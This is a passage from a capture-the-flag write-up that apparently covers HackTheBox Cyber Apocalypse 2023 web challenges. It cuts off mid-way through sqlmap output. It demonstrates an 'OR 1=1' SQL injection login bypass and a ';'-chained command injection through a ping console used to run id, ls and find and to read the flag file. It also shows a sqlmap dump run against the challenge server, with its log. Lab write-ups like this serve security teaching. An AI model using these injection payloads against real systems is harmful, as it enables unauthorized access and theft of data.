<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">def login(username, password):
</span></span><span class="line"><span class="cl">    # We should update our code base and use techniques like parameterization to avoid SQL Injection
</span></span><span class="line"><span class="cl">    user = query_db(f&#39;SELECT password FROM users WHERE username = &#34;{username}&#34; AND password = &#34;{password}&#34; &#39;, one=True)
</span></span></code></pre></td></tr></table>
</div>
</div><p>The comment is a pretty plain hint that this SQL query is not well sanitized, and allows for very basic SQL injection.
For our user submission, we will escape the username query with &ldquo;, then bypass a password check with &ldquo;OR 1=1 &ndash; &ldquo;. The end result is we will login if the database can find a user called &quot;&rdquo; or if the value 1 is equal to 1. Since the latter is always true, we should login. Note that the space after comment lines &ndash; must be present, or else this will be interpreted as minus.</p>
<p><img src="/post/hackthebox_cyber_apocalypse_2023/Images/20230325103055.png"
	width="500"
	height="426"
	srcset="/post/hackthebox_cyber_apocalypse_2023/Images/20230325103055_hu1818775252856987229.png 480w, /post/hackthebox_cyber_apocalypse_2023/Images/20230325103055_hu8251940294079942205.png 1024w"
	loading="lazy"
	
		alt="image"
	
	
		class="gallery-image" 
		data-flex-grow="117"
		data-flex-basis="281px"
	
></p>
<p>The password will never be checked, so this can be whatever.
Just like that, we are in. And the flag is first up on the table.</p>
<p><img src="/post/hackthebox_cyber_apocalypse_2023/Images/20230325103409.png"
	width="1302"
	height="455"
	srcset="/post/hackthebox_cyber_apocalypse_2023/Images/20230325103409_hu13973491835138496660.png 480w, /post/hackthebox_cyber_apocalypse_2023/Images/20230325103409_hu10845563265924660261.png 1024w"
	loading="lazy"
	
		alt="image"
	
	
		class="gallery-image" 
		data-flex-grow="286"
		data-flex-basis="686px"
	
></p>
<p><code>HTB{p4r4m3t3r1z4t10n_1s_1mp0rt4nt!!!}</code></p>
<h3 id="gunhead">Gunhead
</h3><blockquote>
<p>During Pandora&rsquo;s training, the Gunhead AI combat robot had been tampered with and was now malfunctioning, causing it to become uncontrollable. With the situation escalating rapidly, Pandora used her hacking skills to infiltrate the managing system of Gunhead and urgently needs to take it down.
<strong>Difficulty: very easy</strong></p>
</blockquote>
<hr>
<p>Visiting the website we see a lot of text, and the only interactable piece seems to be a pull-up console:</p>
<p><img src="/post/hackthebox_cyber_apocalypse_2023/Images/20230325103826.png"
	width="801"
	height="254"
	srcset="/post/hackthebox_cyber_apocalypse_2023/Images/20230325103826_hu17591443549760261201.png 480w, /post/hackthebox_cyber_apocalypse_2023/Images/20230325103826_hu3774019907795881856.png 1024w"
	loading="lazy"
	
		alt="image"
	
	
		class="gallery-image" 
		data-flex-grow="315"
		data-flex-basis="756px"
	
></p>
<p>Our options for commands are extremely limited. Perhaps the provided source code can give us  more insight?
In ReconModel.php, we see how the program handles this ping command:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="o">$</span> <span class="n">cat</span> <span class="n">ReconModel</span><span class="o">.</span><span class="n">php</span> 
</span></span><span class="line"><span class="cl"><span class="o">&lt;</span><span class="err">?</span><span class="n">php</span>
</span></span><span class="line"><span class="cl"><span class="c1">#[AllowDynamicProperties]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="n">ReconModel</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>   
</span></span><span class="line"><span class="cl">    <span class="n">public</span> <span class="n">function</span> <span class="n">__construct</span><span class="p">(</span><span class="o">$</span><span class="n">ip</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="o">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">ip</span> <span class="o">=</span> <span class="o">$</span><span class="n">ip</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">public</span> <span class="n">function</span> <span class="n">getOutput</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="c1"># Do I need to sanitize user input before passing it to shell_exec?</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">shell_exec</span><span class="p">(</span><span class="s1">&#39;ping -c 3 &#39;</span><span class="o">.$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">ip</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>We have a commented note pointing out the lack of sanitization within the shell_exec. We should be able to use this /ping command to execute multiple shell commands when we include a break;
Testing with id:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">/ping 8.8.8.8; id
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/post/hackthebox_cyber_apocalypse_2023/Images/20230325104911.png"
	width="689"
	height="75"
	srcset="/post/hackthebox_cyber_apocalypse_2023/Images/20230325104911_hu17802916645009187905.png 480w, /post/hackthebox_cyber_apocalypse_2023/Images/20230325104911_hu15672376636965845813.png 1024w"
	loading="lazy"
	
		alt="image"
	
	
		class="gallery-image" 
		data-flex-grow="918"
		data-flex-basis="2204px"
	
></p>
<p>We see the 2nd shows our id. This command injection is successful. We will probe the current directory, and since there&rsquo;s no harm, take a guess that flag.txt is in our current directory:</p>
<p><img src="/post/hackthebox_cyber_apocalypse_2023/Images/20230325105242.png"
	width="690"
	height="153"
	srcset="/post/hackthebox_cyber_apocalypse_2023/Images/20230325105242_hu16931572014402622605.png 480w, /post/hackthebox_cyber_apocalypse_2023/Images/20230325105242_hu13293187241461504513.png 1024w"
	loading="lazy"
	
		alt="image"
	
	
		class="gallery-image" 
		data-flex-grow="450"
		data-flex-basis="1082px"
	
></p>
<p>We didn&rsquo;t hit it this time, but using this command scheme we can keep using <code>ls</code> to poke around for the flag. Or we can try <code>find</code>.</p>
<p><img src="/post/hackthebox_cyber_apocalypse_2023/Images/20230325105457.png"
	width="694"
	height="99"
	srcset="/post/hackthebox_cyber_apocalypse_2023/Images/20230325105457_hu3186746622874226035.png 480w, /post/hackthebox_cyber_apocalypse_2023/Images/20230325105457_hu7321633357612135655.png 1024w"
	loading="lazy"
	
		alt="image"
	
	
		class="gallery-image" 
		data-flex-grow="701"
		data-flex-basis="1682px"
	
></p>
<p>Now we find it in probably the next most likely location, the base directory.</p>
<p><img src="/post/hackthebox_cyber_apocalypse_2023/Images/20230325105542.png"
	width="698"
	height="73"
	srcset="/post/hackthebox_cyber_apocalypse_2023/Images/20230325105542_hu17399228628173065330.png 480w, /post/hackthebox_cyber_apocalypse_2023/Images/20230325105542_hu6006428703155609797.png 1024w"
	loading="lazy"
	
		alt="iamge"
	
	
		class="gallery-image" 
		data-flex-grow="956"
		data-flex-basis="2294px"
	
></p>
<p><code>HTB{4lw4y5_54n1t1z3_u53r_1nput!!!}</code></p>
<h3 id="orbital">Orbital
</h3><blockquote>
<p>In order to decipher the alien communication that held the key to their location, she needed access to a decoder with advanced capabilities - a decoder that only The Orbital firm possessed. Can you get your hands on the decoder?
<strong>Difficulty: easy</strong></p>
</blockquote>
<hr>
<p>Visiting the site shows us a generic login page. After trying the classic admin:admin and admin:password credentials, perhaps we can find more information on what&rsquo;s happening by viewing the provided source code.
When viewing the <code>database.py</code>, we find an interesting hint/note:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">def login(username, password):
</span></span><span class="line"><span class="cl">    # I don&#39;t think it&#39;s not possible to bypass login because I&#39;m verifying the password later.
</span></span><span class="line"><span class="cl">    user = query(f&#39;SELECT username, password FROM users WHERE username = &#34;{username}&#34;&#39;, one=True)
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    if user:
</span></span><span class="line"><span class="cl">        passwordCheck = passwordVerify(user[&#39;password&#39;], password)
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        if passwordCheck:
</span></span><span class="line"><span class="cl">            token = createJWT(user[&#39;username&#39;])
</span></span><span class="line"><span class="cl">            return token
</span></span><span class="line"><span class="cl">    else:
</span></span><span class="line"><span class="cl">        return False
</span></span></code></pre></td></tr></table>
</div>
</div><p>Our SQL injection approach from Drobots has been remedied. Even when we bypass the username input check, the password is verified in a separate instance. Problem solved, or is it?</p>
<p>Before moving on to probing SQL injection further, I check for potentially alternative pages by looking at the <code>routes.py</code> file. The only other page is an /export page, that requires a valid JSON token. So we will explore the login bypass further.</p>
<p>Instead of manually checking a variety of SQL payloads, we will employ a tool to make this quick and easy: SQLmap. SQLmap can be easily set up to do post requests by passing it the request information in a file:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">$ cat post.txt         
</span></span><span class="line"><span class="cl">POST /api/login HTTP/1.1
</span></span><span class="line"><span class="cl">Host: 68.183.45.143:30274
</span></span><span class="line"><span class="cl">User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
</span></span><span class="line"><span class="cl">Accept: */*
</span></span><span class="line"><span class="cl">Accept-Language: en-US,en;q=0.5
</span></span><span class="line"><span class="cl">Accept-Encoding: gzip, deflate
</span></span><span class="line"><span class="cl">Referer: http://68.183.45.143:30274/
</span></span><span class="line"><span class="cl">Content-Type: application/json
</span></span><span class="line"><span class="cl">Origin: http://68.183.45.143:30274
</span></span><span class="line"><span class="cl">Content-Length: 42
</span></span><span class="line"><span class="cl">Connection: close
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">{&#34;username&#34;:&#34;admin&#34;,&#34;password&#34;:&#34;password&#34;}
</span></span></code></pre></td></tr></table>
</div>
</div><p>Full sqlmap dump output.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">  1
</span><span class="lnt">  2
</span><span class="lnt">  3
</span><span class="lnt">  4
</span><span class="lnt">  5
</span><span class="lnt">  6
</span><span class="lnt">  7
</span><span class="lnt">  8
</span><span class="lnt">  9
</span><span class="lnt"> 10
</span><span class="lnt"> 11
</span><span class="lnt"> 12
</span><span class="lnt"> 13
</span><span class="lnt"> 14
</span><span class="lnt"> 15
</span><span class="lnt"> 16
</span><span class="lnt"> 17
</span><span class="lnt"> 18
</span><span class="lnt"> 19
</span><span class="lnt"> 20
</span><span class="lnt"> 21
</span><span class="lnt"> 22
</span><span class="lnt"> 23
</span><span class="lnt"> 24
</span><span class="lnt"> 25
</span><span class="lnt"> 26
</span><span class="lnt"> 27
</span><span class="lnt"> 28
</span><span class="lnt"> 29
</span><span class="lnt"> 30
</span><span class="lnt"> 31
</span><span class="lnt"> 32
</span><span class="lnt"> 33
</span><span class="lnt"> 34
</span><span class="lnt"> 35
</span><span class="lnt"> 36
</span><span class="lnt"> 37
</span><span class="lnt"> 38
</span><span class="lnt"> 39
</span><span class="lnt"> 40
</span><span class="lnt"> 41
</span><span class="lnt"> 42
</span><span class="lnt"> 43
</span><span class="lnt"> 44
</span><span class="lnt"> 45
</span><span class="lnt"> 46
</span><span class="lnt"> 47
</span><span class="lnt"> 48
</span><span class="lnt"> 49
</span><span class="lnt"> 50
</span><span class="lnt"> 51
</span><span class="lnt"> 52
</span><span class="lnt"> 53
</span><span class="lnt"> 54
</span><span class="lnt"> 55
</span><span class="lnt"> 56
</span><span class="lnt"> 57
</span><span class="lnt"> 58
</span><span class="lnt"> 59
</span><span class="lnt"> 60
</span><span class="lnt"> 61
</span><span class="lnt"> 62
</span><span class="lnt"> 63
</span><span class="lnt"> 64
</span><span class="lnt"> 65
</span><span class="lnt"> 66
</span><span class="lnt"> 67
</span><span class="lnt"> 68
</span><span class="lnt"> 69
</span><span class="lnt"> 70
</span><span class="lnt"> 71
</span><span class="lnt"> 72
</span><span class="lnt"> 73
</span><span class="lnt"> 74
</span><span class="lnt"> 75
</span><span class="lnt"> 76
</span><span class="lnt"> 77
</span><span class="lnt"> 78
</span><span class="lnt"> 79
</span><span class="lnt"> 80
</span><span class="lnt"> 81
</span><span class="lnt"> 82
</span><span class="lnt"> 83
</span><span class="lnt"> 84
</span><span class="lnt"> 85
</span><span class="lnt"> 86
</span><span class="lnt"> 87
</span><span class="lnt"> 88
</span><span class="lnt"> 89
</span><span class="lnt"> 90
</span><span class="lnt"> 91
</span><span class="lnt"> 92
</span><span class="lnt"> 93
</span><span class="lnt"> 94
</span><span class="lnt"> 95
</span><span class="lnt"> 96
</span><span class="lnt"> 97
</span><span class="lnt"> 98
</span><span class="lnt"> 99
</span><span class="lnt">100
</span><span class="lnt">101
</span><span class="lnt">102
</span><span class="lnt">103
</span><span class="lnt">104
</span><span class="lnt">105
</span><span class="lnt">106
</span><span class="lnt">107
</span><span class="lnt">108
</span><span class="lnt">109
</span><span class="lnt">110
</span><span class="lnt">111
</span><span class="lnt">112
</span><span class="lnt">113
</span><span class="lnt">114
</span><span class="lnt">115
</span><span class="lnt">116
</span><span class="lnt">117
</span><span class="lnt">118
</span><span class="lnt">119
</span><span class="lnt">120
</span><span class="lnt">121
</span><span class="lnt">122
</span><span class="lnt">123
</span><span class="lnt">124
</span><span class="lnt">125
</span><span class="lnt">126
</span><span class="lnt">127
</span><span class="lnt">128
</span><span class="lnt">129
</span><span class="lnt">130
</span><span class="lnt">131
</span><span class="lnt">132
</span><span class="lnt">133
</span><span class="lnt">134
</span><span class="lnt">135
</span><span class="lnt">136
</span><span class="lnt">137
</span><span class="lnt">138
</span><span class="lnt">139
</span><span class="lnt">140
</span><span class="lnt">141
</span><span class="lnt">142
</span><span class="lnt">143
</span><span class="lnt">144
</span><span class="lnt">145
</span><span class="lnt">146
</span><span class="lnt">147
</span><span class="lnt">148
</span><span class="lnt">149
</span><span class="lnt">150
</span><span class="lnt">151
</span><span class="lnt">152
</span><span class="lnt">153
</span><span class="lnt">154
</span><span class="lnt">155
</span><span class="lnt">156
</span><span class="lnt">157
</span><span class="lnt">158
</span><span class="lnt">159
</span><span class="lnt">160
</span><span class="lnt">161
</span><span class="lnt">162
</span><span class="lnt">163
</span><span class="lnt">164
</span><span class="lnt">165
</span><span class="lnt">166
</span><span class="lnt">167
</span><span class="lnt">168
</span><span class="lnt">169
</span><span class="lnt">170
</span><span class="lnt">171
</span><span class="lnt">172
</span><span class="lnt">173
</span><span class="lnt">174
</span><span class="lnt">175
</span><span class="lnt">176
</span><span class="lnt">177
</span><span class="lnt">178
</span><span class="lnt">179
</span><span class="lnt">180
</span><span class="lnt">181
</span><span class="lnt">182
</span><span class="lnt">183
</span><span class="lnt">184
</span><span class="lnt">185
</span><span class="lnt">186
</span><span class="lnt">187
</span><span class="lnt">188
</span><span class="lnt">189
</span><span class="lnt">190
</span><span class="lnt">191
</span><span class="lnt">192
</span><span class="lnt">193
</span><span class="lnt">194
</span><span class="lnt">195
</span><span class="lnt">196
</span><span class="lnt">197
</span><span class="lnt">198
</span><span class="lnt">199
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="o">$</span> <span class="n">sqlmap</span> <span class="o">-</span><span class="n">r</span> <span class="n">post</span><span class="o">.</span><span class="n">txt</span> <span class="o">-</span><span class="n">p</span> <span class="n">username</span> <span class="o">--</span><span class="n">dbms</span><span class="o">=</span><span class="n">mysql</span> <span class="o">--</span><span class="n">dump</span> 
</span></span><span class="line"><span class="cl">        <span class="n">___</span>
</span></span><span class="line"><span class="cl">       <span class="n">__H__</span>                                                                                                                                                                                                                               
</span></span><span class="line"><span class="cl"> <span class="n">___</span> <span class="n">___</span><span class="p">[(]</span><span class="n">_____</span> <span class="n">___</span> <span class="n">___</span>  <span class="p">{</span><span class="mf">1.7</span><span class="o">.</span><span class="mi">2</span><span class="c1">#stable}                                                                                                                                                                                                   </span>
</span></span><span class="line"><span class="cl"><span class="o">|</span><span class="n">_</span> <span class="o">-|</span> <span class="o">.</span> <span class="p">[,]</span>     <span class="o">|</span> <span class="o">.</span><span class="s1">&#39;| . |                                                                                                                                                                                                                  </span>
</span></span><span class="line"><span class="cl"><span class="o">|</span><span class="n">___</span><span class="o">|</span><span class="n">_</span>  <span class="p">[</span><span class="s2">&#34;]_|_|_|__,|  _|                                                                                                                                                                                                                  </span>
</span></span><span class="line"><span class="cl">      <span class="o">|</span><span class="n">_</span><span class="o">|</span><span class="n">V</span><span class="o">...</span>       <span class="o">|</span><span class="n">_</span><span class="o">|</span>   <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">sqlmap</span><span class="o">.</span><span class="n">org</span>                                                                                                                                                                                               
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">!</span><span class="p">]</span> <span class="n">legal</span> <span class="n">disclaimer</span><span class="p">:</span> <span class="n">Usage</span> <span class="n">of</span> <span class="n">sqlmap</span> <span class="k">for</span> <span class="n">attacking</span> <span class="n">targets</span> <span class="n">without</span> <span class="n">prior</span> <span class="n">mutual</span> <span class="n">consent</span> <span class="n">is</span> <span class="n">illegal</span><span class="o">.</span> <span class="n">It</span> <span class="n">is</span> <span class="n">the</span> <span class="n">end</span> <span class="n">user</span><span class="s1">&#39;s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">starting</span> <span class="err">@</span> <span class="mi">19</span><span class="p">:</span><span class="mi">23</span><span class="p">:</span><span class="mi">08</span> <span class="o">/</span><span class="mi">2023</span><span class="o">-</span><span class="mi">03</span><span class="o">-</span><span class="mi">20</span><span class="o">/</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="mi">19</span><span class="p">:</span><span class="mi">23</span><span class="p">:</span><span class="mi">08</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">parsing</span> <span class="n">HTTP</span> <span class="n">request</span> <span class="n">from</span> <span class="s1">&#39;post.txt&#39;</span>
</span></span><span class="line"><span class="cl"><span class="n">JSON</span> <span class="n">data</span> <span class="n">found</span> <span class="ow">in</span> <span class="n">POST</span> <span class="n">body</span><span class="o">.</span> <span class="n">Do</span> <span class="n">you</span> <span class="n">want</span> <span class="n">to</span> <span class="n">process</span> <span class="n">it</span><span class="err">?</span> <span class="p">[</span><span class="n">Y</span><span class="o">/</span><span class="n">n</span><span class="o">/</span><span class="n">q</span><span class="p">]</span> <span class="n">y</span>
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="mi">19</span><span class="p">:</span><span class="mi">23</span><span class="p">:</span><span class="mi">16</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">testing</span> <span class="n">connection</span> <span class="n">to</span> <span class="n">the</span> <span class="n">target</span> <span class="n">URL</span>
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="mi">19</span><span class="p">:</span><span class="mi">23</span><span class="p">:</span><span class="mi">16</span><span class="p">]</span> <span class="p">[</span><span class="n">WARNING</span><span class="p">]</span> <span class="n">the</span> <span class="n">web</span> <span class="n">server</span> <span class="n">responded</span> <span class="n">with</span> <span class="n">an</span> <span class="n">HTTP</span> <span class="n">error</span> <span class="n">code</span> <span class="p">(</span><span class="mi">403</span><span class="p">)</span> <span class="n">which</span> <span class="n">could</span> <span class="n">interfere</span> <span class="n">with</span> <span class="n">the</span> <span class="n">results</span> <span class="n">of</span> <span class="n">the</span> <span class="n">tests</span>
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="mi">19</span><span class="p">:</span><span class="mi">23</span><span class="p">:</span><span class="mi">16</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">checking</span> <span class="k">if</span> <span class="n">the</span> <span class="n">target</span> <span class="n">is</span> <span class="n">protected</span> <span class="n">by</span> <span class="n">some</span> <span class="n">kind</span> <span class="n">of</span> <span class="n">WAF</span><span class="o">/</span><span class="n">IPS</span>
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="mi">19</span><span class="p">:</span><span class="mi">23</span><span class="p">:</span><span class="mi">16</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">testing</span> <span class="k">if</span> <span class="n">the</span> <span class="n">target</span> <span class="n">URL</span> <span class="n">content</span> <span class="n">is</span> <span class="n">stable</span>
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="mi">19</span><span class="p">:</span><span class="mi">23</span><span class="p">:</span><span class="mi">16</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">target</span> <span class="n">URL</span> <span class="n">content</span> <span class="n">is</span> <span class="n">stable</span>
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="mi">19</span><span class="p">:</span><span class="mi">23</span><span class="p">:</span><span class="mi">16</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">heuristic</span> <span class="p">(</span><span class="n">basic</span><span class="p">)</span> <span class="n">test</span> <span class="n">shows</span> <span class="n">that</span> <span class="p">(</span><span class="n">custom</span><span class="p">)</span> <span class="n">POST</span> <span class="n">parameter</span> <span class="s1">&#39;JSON username&#39;</span> <span class="n">might</span> <span class="n">be</span> <span class="n">injectable</span> <span class="p">(</span><span class="n">possible</span> <span class="n">DBMS</span><span class="p">:</span> <span class="s1">&#39;MySQL&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="mi">19</span><span class="p">:</span><span class="mi">23</span><span class="p">:</span><span class="mi">17</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">testing</span> <span class="k">for</span> <span class="n">SQL</span> <span class="n">injection</span> <span class="n">on</span> <span class="p">(</span><span class="n">custom</span><span class="p">)</span> <span class="n">POST</span> <span class="n">parameter</span> <span class="s1">&#39;JSON username&#39;</span>
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">the</span> <span class="n">remaining</span> <span class="n">tests</span><span class="p">,</span> <span class="k">do</span> <span class="n">you</span> <span class="n">want</span> <span class="n">to</span> <span class="n">include</span> <span class="n">all</span> <span class="n">tests</span> <span class="k">for</span> <span class="s1">&#39;MySQL&#39;</span> <span class="n">extending</span> <span class="n">provided</span> <span class="n">level</span> <span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="ow">and</span> <span class="n">risk</span> <span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="n">values</span><span class="err">?</span> <span class="p">[</span><span class="n">Y</span><span class="o">/</span><span class="n">n</span><span class="p">]</span> 
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="mi">19</span><span class="p">:</span><span class="mi">23</span><span class="p">:</span><span class="mi">20</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">testing</span> <span class="s1">&#39;AND boolean-based blind - WHERE or HAVING clause&#39;</span>
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="mi">19</span><span class="p">:</span><span class="mi">23</span><span class="p">:</span><span class="mi">22</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">testing</span> <span class="s1">&#39;Boolean-based blind - Parameter replace (original value)&#39;</span>
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="mi">19</span><span class="p">:</span><span class="mi">23</span><span class="p">:</span><span class="mi">22</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">testing</span> <span class="s1">&#39;Generic inline queries&#39;</span>
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="mi">19</span><span class="p">:</span><span class="mi">23</span><span class="p">:</span><span class="mi">22</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">testing</span> <span class="s1">&#39;AND boolean-based blind - WHERE or HAVING clause (MySQL comment)&#39;</span>
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="mi">19</span><span class="p">:</span><span class="mi">23</span><span class="p">:</span><span class="mi">25</span><span class="p">]</span> <span class="p">[</span><span class="n">WARNING</span><span class="p">]</span> <span class="n">reflective</span> <span class="n">value</span><span class="p">(</span><span class="n">s</span><span class="p">)</span> <span class="n">found</span> <span class="ow">and</span> <span class="n">filtering</span> <span class="n">out</span>
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="mi">19</span><span class="p">:</span><span class="mi">23</span><span class="p">:</span><span class="mi">28</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">testing</span> <span class="s1">&#39;OR boolean-based blind - WHERE or HAVING clause (MySQL comment)&#39;</span>
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="mi">19</span><span class="p">:</span><span class="mi">23</span><span class="p">:</span><span class="mi">34</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">testing</span> <span class="s1">&#39;OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)&#39;</span>
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="mi">19</span><span class="p">:</span><span class="mi">23</span><span class="p">:</span><span class="mi">40</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">testing</span> <span class="s1">&#39;MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause&#39;</span>
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="mi">19</span><span class="p">:</span><span class="mi">23</span><span class="p">:</span><span class="mi">51</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">testing</span> <span class="s1">&#39;MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)&#39;</span>
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="mi">19</span><span class="p">:</span><span class="mi">24</span><span class="p">:</span><span class="mi">02</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">testing</span> <span class="s1">&#39;MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)&#39;</span>
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="mi">19</span><span class="p">:</span><span class="mi">24</span><span class="p">:</span><span class="mi">12</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">testing</span> <span class="s1">&#39;MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT)&#39;</span>
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="mi">19</span><span class="p">:</span><span class="mi">24</span><span class="p">:</span><span class="mi">23</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">testing</span> <span class="s1">&#39;MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT)&#39;</span>
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="mi">19</span><span class="p">:</span><span class="mi">24</span><span class="p">:</span><span class="mi">33</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">testing</span> <span class="s1">&#39;MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (bool*int)&#39;</span>
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="mi">19</span><span class="p">:</span><span class="mi">24</span><span class="p">:</span><span class="mi">52</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">testing</span> <span class="s1">&#39;MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (bool*int)&#39;</span>
